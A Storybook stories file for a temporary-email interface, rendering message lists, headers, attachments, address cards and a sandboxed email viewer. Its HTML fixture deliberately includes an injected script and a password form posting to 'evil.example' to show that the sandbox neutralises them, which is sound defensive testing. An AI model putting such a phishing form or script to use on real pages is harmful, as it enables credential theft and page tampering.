import type { Meta, StoryObj } from '@storybook/react-vite';
import { Inbox, Mail, Plus, Trash } from '@robin-dot-lab/icons';
import {
  AddressCard, AttachmentChip, AttachmentList, EmailViewer, MessageHeader, MessageList, MessageListItem, type MessageSummary,
} from '@robin-dot-lab/mail';
import { AppShell, Button, MobileNav, Sidebar, SidebarItem, SidebarSection, Split, Stack, Topbar } from '@robin-dot-lab/react';
import { useState } from 'react';

const meta = {
  title: 'Mail/Components',
  component: MessageList,
  subcomponents: { MessageListItem, MessageHeader, EmailViewer, AttachmentChip, AttachmentList, AddressCard },
  // The email inside the viewer is third-party content in a sandbox with an opaque origin: axe (the a11y
  // addon) must not try to message that frame, which Firefox and WebKit report as a console error.
  parameters: { a11y: { options: { iframes: false } } },
} satisfies Meta<typeof MessageList>;
export default meta;
// Render-only stories: the components have required props, so args are not typed here.
type Story = StoryObj;

// Dates relative to the moment the story renders, so the wording (and the screenshot) never drifts.
const MIN = 60_000;
const ago = (ms: number) => Date.now() - ms;

const MESSAGES: MessageSummary[] = [
  { id: 'm1', from: { name: 'Pixel Party', address: 'hello@pixelparty.example' }, subject: 'Your ticket for Figma Pixel Party', preview: 'Hi! Your ticket is attached. Doors open at 6 pm, bring your badge.', date: ago(2 * MIN), unread: true, hasAttachments: true },
  { id: 'm2', from: { name: 'Shader Jam', address: 'team@shaderjam.example' }, subject: 'Confirm your email address', preview: 'Click the link below to confirm the address you signed up with.', date: ago(25 * MIN), unread: true },
  { id: 'm3', from: { address: 'noreply@shop.example' }, subject: 'Your order has shipped', preview: 'Order #4821 is on its way and should arrive on Tuesday.', date: ago(5 * 60 * MIN) },
  { id: 'm4', from: { name: 'Ada', address: 'ada@example.org' }, subject: '', preview: 'Testing the new address.', date: ago(2 * 24 * 60 * MIN) },
];

const HTML = `<div style="font-family: sans-serif; padding: 16px">
  <h1 style="margin-top: 0">Your ticket is ready</h1>
  <p>Hi! Here is your ticket for <strong>Figma Pixel Party</strong>, Saturday 27 April in Lyon.</p>
  <p><img src="https://tracker.example/banner.png" alt="Pixel Party banner" width="320" height="80"></p>
  <p><a href="https://pixelparty.example/ticket/4821">Open your ticket</a></p>
  <script>document.body.innerHTML = 'hacked'</script>
  <form action="https://evil.example"><input name="password"><button>Log in</button></form>
</div>`;
const TEXT = 'Hi! Here is your ticket for Figma Pixel Party, Saturday 27 April in Lyon.\n\nOpen your ticket: https://pixelparty.example/ticket/4821';
const SOURCE = `From: Pixel Party <hello@pixelparty.example>
To: pixel-otter-42@nerdlab.sh
Subject: Your ticket for Figma Pixel Party
Content-Type: multipart/alternative; boundary="b1"

--b1
Content-Type: text/plain; charset=utf-8

${TEXT}`;
const ATTACHMENTS = [
  { name: 'ticket-4821.pdf', size: 184_000, type: 'application/pdf', href: '#ticket' },
  { name: 'map.png', size: 642_300, type: 'image/png', href: '#map' },
  { name: 'press-kit.zip', size: 12_800_000, type: 'application/zip', href: '#kit' },
];

function List(props: { loading?: boolean; empty?: boolean }) {
  const [id, setId] = useState<string | null>('m1');
  return <div style={{ maxWidth: 480 }}><MessageList messages={props.empty ? [] : MESSAGES} selectedId={id} onSelectionChange={setId} loading={props.loading} shortcuts /></div>;
}

/** A ListBox: ↑/↓ and j/k move the selection (j/k not while typing in a field). Unread: bold, a dot, and “Unread” in words. */
export const Messages: Story = { render: () => <List /> };

/** Each row can be rendered by hand with the children function, here to prefix the subjects. */
export const MessagesCustomRows: Story = {
  render: () => (
    <div style={{ maxWidth: 480 }}>
      <MessageList messages={MESSAGES.slice(0, 2)}>{(m) => <MessageListItem message={{ ...m, subject: `[Tickets] ${m.subject}` }} />}</MessageList>
    </div>
  ),
};
export const MessagesLoading: Story = { render: () => <List loading /> };
export const MessagesEmpty: Story = { render: () => <List empty /> };

/** Subject, From / To / Date, and the actions. */
export const Header: Story = {
  render: () => (
    <div style={{ maxWidth: 720 }}>
      <MessageHeader subject="Your ticket for Figma Pixel Party" from={MESSAGES[0]!.from} to={{ address: 'pixel-otter-42@nerdlab.sh' }} date={ago(2 * MIN)} onDelete={() => {}} onViewSource={() => {}} />
    </div>
  ),
};

/** The HTML in a sandboxed iframe with a CSP: the script and the form in this message do nothing, the remote image waits for “Show images”. */
export const Viewer: Story = {
  render: () => <div style={{ maxWidth: 720 }}><EmailViewer html={HTML} text={TEXT} source={SOURCE} /></div>,
};

/** Icon by type, size in the locale, a link named “Download <file>”. */
export const Attachments: Story = {
  render: () => (
    <Stack gap={4}>
      <AttachmentList attachments={ATTACHMENTS} />
      <div><AttachmentChip attachment={{ name: 'notes.txt', size: 980, type: 'text/plain', href: '#notes' }} /></div>
    </Stack>
  ),
};

/** One address: copy it, unread count, time left in words and as a bar, actions menu. */
export const Addresses: Story = {
  render: () => (
    <Stack gap={4} style={{ maxWidth: 420 }}>
      <AddressCard address="pixel-otter-42@nerdlab.sh" unread={2} createdAt={ago(18 * MIN)} expiresAt={Date.now() + 42 * MIN} />
      <AddressCard address="quiet-fox-7@nerdlab.sh" createdAt={ago(57 * MIN)} expiresAt={Date.now() + 3 * MIN} />
      <AddressCard address="old-moth-3@nerdlab.sh" createdAt={ago(61 * MIN)} expiresAt={ago(MIN)} />
    </Stack>
  ),
};

/** The whole platform screen: AppShell, the addresses, the inbox and the open message in a Split. */
export const Dashboard: Story = {
  parameters: { layout: 'fullscreen' },
  render: function Render() {
    const [id, setId] = useState<string | null>('m1');
    const open = MESSAGES.find((m) => m.id === id) ?? MESSAGES[0]!;
    return (
      <AppShell
        sidebar={
          <Sidebar label="Main navigation" header={<b className="nl-display">nerdlab.sh</b>}>
            <SidebarSection title="Mail">
              <SidebarItem href="#inbox" icon={<Inbox />} current count={2} countLabel="2 unread">Inbox</SidebarItem>
              <SidebarItem href="#addresses" icon={<Mail />}>Addresses</SidebarItem>
              <SidebarItem href="#trash" icon={<Trash />}>Trash</SidebarItem>
            </SidebarSection>
          </Sidebar>
        }
        topbar={<Topbar title={<h1>Inbox</h1>} actions={<Button variant="primary" size="sm"><Plus /> New address</Button>} mobileNav={<MobileNav><a href="#inbox">Inbox</a><a href="#addresses">Addresses</a></MobileNav>} />}
      >
        <AddressCard address="pixel-otter-42@nerdlab.sh" unread={2} createdAt={ago(18 * MIN)} expiresAt={Date.now() + 42 * MIN} />
        <Split ratio="sidebar" gap={4}>
          <MessageList messages={MESSAGES} selectedId={id} onSelectionChange={setId} shortcuts />
          <Stack gap={4}>
            <MessageHeader subject={open.subject} from={open.from} to={{ address: 'pixel-otter-42@nerdlab.sh' }} date={open.date} onDelete={() => {}} />
            {open.hasAttachments && <AttachmentList attachments={ATTACHMENTS.slice(0, 1)} />}
            <EmailViewer html={HTML} text={TEXT} source={SOURCE} />
          </Stack>
        </Split>
      </AppShell>
    );
  },
};
